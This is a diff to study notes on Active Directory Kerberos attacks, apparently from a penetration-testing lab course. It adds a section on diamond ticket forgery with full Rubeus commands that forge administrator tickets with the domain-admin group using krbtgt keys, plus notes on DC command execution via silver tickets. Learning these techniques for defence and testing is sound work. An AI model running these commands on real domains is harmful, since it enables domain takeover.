@@ -1,3 +1,23 @@
+### Diamond Ticket
+- A diamond ticket is _created by deciphering a valid TGT_, making changes to it and re-encrypt it using the AES keys of the krbtgt account.
+- Golden ticket was a TGT forging attacks whereas diamond ticket is a TGT modification attack.
+- A diamond ticket is more opsec safe as it has:
+	- Valid ticket times because a TGT issued by the DC is modified
+	- In golden ticket, there is no corresponding TGT request for TGS/Service ticket requests as the TGT is forged.
+
+#### Attack
+```powershell
+Rubeus.exe diamond
+/krbkey:$hash /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+• We could also use /tgtdeleg option in place of credentials in case we have access as a domain user:
+```powershell
+Rubeus.exe diamond /krbkey:$hash /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+
+
+---
 ### Silver Ticket
 - Encrypted and Signed by the hash of the service account of the service running with that account.
 - Services rarely check PAC (Privileged Attribute Certificate).
@@ -21,6 +41,9 @@ schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Autho
 schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
 ```
 
+Command execution on the domain controller by creating silver tickets for:
+– HOST service
+– WMI
 
 
 ---
